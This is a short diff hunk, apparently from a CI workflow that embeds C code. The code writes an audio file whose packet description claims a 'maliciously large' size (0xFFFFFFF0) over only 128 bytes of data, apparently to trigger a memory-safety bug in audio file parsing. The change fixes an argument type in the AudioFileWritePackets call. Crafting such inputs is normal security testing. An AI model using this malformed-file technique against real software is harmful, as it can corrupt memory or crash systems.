@@ -60,9 +60,12 @@ jobs:
                   packetDesc.mDataByteSize = 0xFFFFFFF0; // Maliciously large size
 
                   char dummy_data[128] = {0}; // A small amount of actual data
+                  
+                  // Fixed: The 6th argument to AudioFileWritePackets must be a pointer to a UInt32.
+                  UInt32 numPacketsToWrite = 1;
 
                   // Write the packet description with the huge size, but the actual data is small.
-                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), &packetDesc, 0, 1, dummy_data);
+                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), &packetDesc, 0, &numPacketsToWrite, dummy_data);
                   if (status != noErr) {
                       fprintf(stderr, "AudioFileWritePackets failed with status: %d\n", status);
                   }
